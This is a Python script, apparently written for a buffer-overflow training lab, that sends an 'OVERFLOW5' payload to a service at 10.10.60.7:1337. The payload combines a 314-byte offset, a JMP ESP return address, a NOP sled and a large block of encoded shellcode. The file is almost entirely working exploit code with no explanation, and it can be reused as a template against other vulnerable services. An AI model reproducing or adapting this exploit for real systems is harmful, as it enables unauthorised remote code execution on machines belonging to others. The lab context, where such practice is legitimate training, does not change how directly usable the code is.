import socket, struct

host, port = '10.10.60.7', 1337
all_chars = bytearray(range(1,256))
bad_chars = [
b'\x16',
b'\x2f',
b'\xf4',
b'\xfd'

]
def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x62501203)
nop_sled = b'\x90'*10
shellcode =  b""
shellcode += b"\xfc\xbb\x9f\xe2\x0e\xc1\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x63\x0a\x8c\xc1\x9b\xcb\xf1\x48"
shellcode += b"\x7e\xfa\x31\x2e\x0b\xad\x81\x24\x59\x42\x69"
shellcode += b"\x68\x49\xd1\x1f\xa5\x7e\x52\x95\x93\xb1\x63"
shellcode += b"\x86\xe0\xd0\xe7\xd5\x34\x32\xd9\x15\x49\x33"
shellcode += b"\x1e\x4b\xa0\x61\xf7\x07\x17\x95\x7c\x5d\xa4"
shellcode += b"\x1e\xce\x73\xac\xc3\x87\x72\x9d\x52\x93\x2c"
shellcode += b"\x3d\x55\x70\x45\x74\x4d\x95\x60\xce\xe6\x6d"
shellcode += b"\x1e\xd1\x2e\xbc\xdf\x7e\x0f\x70\x12\x7e\x48"
shellcode += b"\xb7\xcd\xf5\xa0\xcb\x70\x0e\x77\xb1\xae\x9b"
shellcode += b"\x63\x11\x24\x3b\x4f\xa3\xe9\xda\x04\xaf\x46"
shellcode += b"\xa8\x42\xac\x59\x7d\xf9\xc8\xd2\x80\x2d\x59"
shellcode += b"\xa0\xa6\xe9\x01\x72\xc6\xa8\xef\xd5\xf7\xaa"
shellcode += b"\x4f\x89\x5d\xa1\x62\xde\xef\xe8\xea\x13\xc2"
shellcode += b"\x12\xeb\x3b\x55\x61\xd9\xe4\xcd\xed\x51\x6c"
shellcode += b"\xc8\xea\x96\x47\xac\x64\x69\x68\xcd\xad\xae"
shellcode += b"\x3c\x9d\xc5\x07\x3d\x76\x15\xa7\xe8\xd9\x45"
shellcode += b"\x07\x43\x9a\x35\xe7\x33\x72\x5f\xe8\x6c\x62"
shellcode += b"\x60\x22\x05\x09\x9b\xa5\x20\xc5\x96\x0d\x5d"
shellcode += b"\xdb\xd8\x4e\xb4\x52\x3e\xfa\xd6\x32\xe9\x93"
shellcode += b"\x4f\x1f\x61\x05\x8f\xb5\x0c\x05\x1b\x3a\xf1"
shellcode += b"\xc8\xec\x37\xe1\xbd\x1c\x02\x5b\x6b\x22\xb8"
shellcode += b"\xf3\xf7\xb1\x27\x03\x71\xaa\xff\x54\xd6\x1c"
shellcode += b"\xf6\x30\xca\x07\xa0\x26\x17\xd1\x8b\xe2\xcc"
shellcode += b"\x22\x15\xeb\x81\x1f\x31\xfb\x5f\x9f\x7d\xaf"
shellcode += b"\x0f\xf6\x2b\x19\xf6\xa0\x9d\xf3\xa0\x1f\x74"
shellcode += b"\x93\x35\x6c\x47\xe5\x39\xb9\x31\x09\x8b\x14"
shellcode += b"\x04\x36\x24\xf1\x80\x4f\x58\x61\x6e\x9a\xd8"
shellcode += b"\x91\x25\x86\x49\x3a\xe0\x53\xc8\x27\x13\x8e"
shellcode += b"\x0f\x5e\x90\x3a\xf0\xa5\x88\x4f\xf5\xe2\x0e"
shellcode += b"\xbc\x87\x7b\xfb\xc2\x34\x7b\x2e\xc2\xba\x83"
shellcode += b"\xd1"

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')
command = b'OVERFLOW5 '
offset = 314
length = 1000
payload = b''.join([
command,
b'A'*offset,
jmp_esp,
nop_sled,
shellcode,
b'C' * (length - offset - len(jmp_esp) - len(nop_sled))
])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
